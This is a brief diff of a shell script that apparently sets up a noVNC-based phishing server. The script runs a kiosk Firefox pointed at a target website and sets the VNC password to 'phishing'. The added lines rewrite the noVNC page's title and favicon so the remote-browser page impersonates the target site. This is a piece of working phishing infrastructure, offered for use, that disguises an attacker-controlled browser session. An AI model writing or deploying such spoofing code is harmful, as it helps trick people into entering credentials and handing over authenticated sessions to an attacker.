@@ -43,6 +43,9 @@ firefox-esr --kiosk ${WEBSITE} &
 exec openbox-session
 EOF
 
+sed -i "s|<title>.*</title>|<title>${TITLE}</title>|" /usr/share/novnc/index.html
+sed -i "s|href=\".*\"|href=\"${FAVICON}\"|" /usr/share/novnc/index.html
+
 chmod 755 /root/.vnc/xstartup
 vncpasswd -f <<< phishing > /root/.vnc/passwd
 vncserver -PasswordFile /root/.vnc/passwd
